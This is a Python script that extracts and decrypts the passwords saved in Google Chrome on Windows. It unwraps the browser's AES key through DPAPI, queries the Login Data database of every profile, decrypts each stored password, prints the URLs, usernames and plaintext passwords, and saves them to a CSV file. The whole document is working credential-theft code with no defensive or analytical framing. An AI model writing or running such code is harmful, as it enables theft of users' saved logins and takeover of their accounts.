import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

# global const
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))


def get_db_connection(chrome_path_login_db):
    print(chrome_path_login_db)
    shutil.copy2(chrome_path_login_db, "Loginvault.db")
    return sqlite3.connect("Loginvault.db")


# 获取明文存储在 CHROME_PATH_LOCAL_STATE 的 AES_KEY
def get_k():
    with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    k = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # Remove suffix DPAPI (Data Protection API)
    k = k[5:]
    #  Use API CryptUnprotectData win32
    k = win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]
    return k


# 生成AES解密密钥
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


# 处理AES对称加密后的密文，密文结构：iv (4 bits) + 被加密的密码密文 + suffix bytes (16 bits)
# 切片取出 iv 和 enc_passwd
# 生成AES解密密钥（iv + key）
# 解密
def decrypt_password(ciphertext, key):
    iv = ciphertext[3:15]
    # Removing suffix bytes (last 16 bits) and the encrypted password is 192 bits
    enc_passwd = ciphertext[15:-16]
    # Build the cipher to decrypt the ciphertext
    AES_dec_cipher = generate_cipher(key, iv)
    dec_passwd = AES_dec_cipher.decrypt(enc_passwd).decode()
    return dec_passwd


if __name__ == '__main__':
    try:
        # Create .csv file to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            # (1) Get secret key
            secret_key = get_k()
            # Search directory  where the encrypted login password is stored
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
            # folders = ['Default']
            for folder in folders:
                # (2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if (url != "" and username != "" and ciphertext != ""):
                            # (3) Filter the initialisation vector & encrypted password from ciphertext
                            # (4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Index: %d" % index)
                            print("URL: %s\nUser Name: %s\nPassword: %s\n" % (url, username, decrypted_password))
                            print("*" * 50)
                            # (5) Save into CSV
                            csv_writer.writerow([index, url, username, decrypted_password])
                    # Close database connection
                    cursor.close()
                    conn.close()
                    # Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s" % (str(e)))
